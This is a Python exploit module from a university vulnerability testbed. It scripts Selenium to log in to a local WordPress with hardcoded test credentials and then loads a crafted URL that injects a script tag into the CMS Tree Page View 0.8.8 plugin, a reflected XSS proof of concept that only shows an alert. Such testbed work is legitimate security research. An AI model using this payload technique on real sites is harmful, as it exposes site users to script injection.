
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import framework
import time

#this script demonstrates a flaw in the plugin, but it does not exploit it outright
                                                                                                                                           
class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_80573",
                  'Description' : "Creates a post containing a XSS payload.",
                  'References' : [['OSVDB','80573'],['https://www.htbridge.com/advisory/HTB23083']],
                  'Target' : "Wordpress 3.2",
                  'TargetLicense' : '',
                  'Type' : "XSS",
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/OSVDB_80573",
                  'Plugin' : "CMS Tree Page View 0.8.8",
                  'Privileged' : True
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
                                                                                                                                                                           
    def exploit(self):                                                                                                                                                        
        driver = self.create_selenium_driver()
        driver.get("http://localhost/wordpress")
        self.logger.info("Page opened successfully: %s", driver.title)
        driver.get("http://localhost/wordpress/wp-login.php")                                                                                                  
        driver.find_element_by_id("user_login").clear()
        driver.find_element_by_id("user_login").send_keys(" wpadmin")
        driver.find_element_by_id("user_pass").clear()
        driver.find_element_by_id("user_pass").send_keys("wpadminpw21")
        driver.find_element_by_id("wp-submit").click()
        time.sleep(5)
        driver.get("http://127.0.0.1/wordpress/wp-admin/options-general.php")
        time.sleep(5)
        driver.get("127.0.0.1/wordpress/wp-admin/options-general.php?page=cms-tpv-options&cms_tpv_view=%22;%3C/script%3E%3Cscr ipt%3Ealert%28'xss'%29;%3C/script%3E")
        time.sleep(5)
        driver.cleanup()
        return                

    def verify(self):
        return True
